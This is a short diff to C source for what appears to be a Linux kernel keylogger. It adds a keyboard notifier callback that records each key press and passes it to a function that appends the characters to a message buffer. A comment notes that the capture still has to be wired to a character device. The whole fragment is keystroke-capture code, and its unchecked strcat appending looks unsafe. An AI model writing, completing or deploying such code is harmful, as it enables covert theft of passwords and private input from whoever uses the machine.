@@ -26,4 +26,16 @@ void update_key(struct keyboard_notifier_param *p)
         msg_Ptr=strcat(msg_Ptr, tav);
     }
 }
+
+int notifier(struct notifier_block *block, unsigned long code, void *p)
+{
+    struct keyboard_notifier_param *param;
+    param =(struct keyboard_notifier_param*) p;
+    /*needs to conect to the char dvice*/
+    if (code == KBD_KEYCODE && param->down)
+    {
+        update_key(param);
+    }
+    return NOTIFY_OK;
+}
 #endif
